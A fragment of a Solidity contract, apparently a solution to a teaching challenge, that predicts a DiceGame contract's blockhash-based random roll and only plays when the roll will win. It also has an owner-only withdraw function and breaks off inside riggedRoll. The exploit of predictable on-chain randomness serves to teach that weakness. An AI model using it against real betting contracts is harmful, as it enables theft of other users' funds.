...
contract RiggedRoll is Ownable {
    ...
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(address(this).balance >= _amount, "no encontrado retiro");

        (bool sent, ) = payable(_addr).call{value: _amount}("");
        require(sent, "retirar no se completo");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        require(address(this).balance >= 2000000000000000, "no hay suficiente eter");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        require(roll <= 2, "este no es ganador");
